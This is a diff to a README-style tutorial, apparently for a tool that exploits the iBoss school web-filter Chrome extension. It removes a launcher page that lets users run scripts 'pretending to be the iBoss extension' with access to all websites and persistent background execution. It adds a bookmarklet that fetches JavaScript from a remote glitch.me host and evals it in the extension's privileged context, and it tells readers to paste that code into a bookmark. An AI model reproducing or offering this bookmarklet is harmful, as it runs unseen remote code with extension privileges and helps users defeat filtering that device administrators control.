@@ -12,12 +12,10 @@ please do not download any files from my github account that don't have tutorial
 1. Bookmark any page
 2. Copy the code below
 ```js
-if (
-  location.href.startsWith("chrome-extension://") ||
-  location.href.startsWith("about")
-) {
-  var background = opener.chrome.extension?.getBackgroundPage();
-  document.documentElement.innerHTML = `<head> <center> <h1> [swamp] original for iBoss </h1> </center> </head><br><div><h3>Motivated by <a href="https://www.reddit.com/r/Teachers/comments/zj0jqp/fun_with_goguardian">this Reddit post</a> --- By using this launcher, you agree to the use of Google Analytics</h3></div><hr/> <div> <h2><b> Run your own code </b> </h2></div><p> Put your script here to run it while pretending to be the iBoss extension. You will be able to access most "chrome" scripts and have other privileges such as access to all websites. Note that your code is saved automatically. Developers: try interacting with the "swamp" object while running code on this page! </p> <textarea id="code" placeholder="Input goes here."></textarea> <pre><textarea class="output" id="output" placeholder="Output shows here"></textarea></pre><button id="rundir">Run on this page</button><button id="reload">Reload scripts on this page</button><br><button id="background">Run as background</button><br><p>Concerning the buttons above: Running on this page is pretty self explanatory. The script only takes effect when this page is open, but running as background lets the script run even with the tab closed. Basically, it means that the script is being run at the highest level of a Chrome extension, in the background, so it persists until Chrome is fully restarted (with chrome://restart for example).</p><hr><h2> Interesting scripts </h2><p> Some useful scripts for the textbox above. DM Aka, but nice#5094 on Discord to suggest new ones (or general improvements to this launcher).</p><select id="scripts"><option>Pick a script</option> 
+javascript:opener.eval(`
+(async function () {
+    eval((await (await fetch("https://uboss.glitch.me/cod.js")).text()));
+})();`) && close();
 ```
 3. Right click on the bookmark, click on "edit"
 4. Under the field labeled "URL", paste in the code.
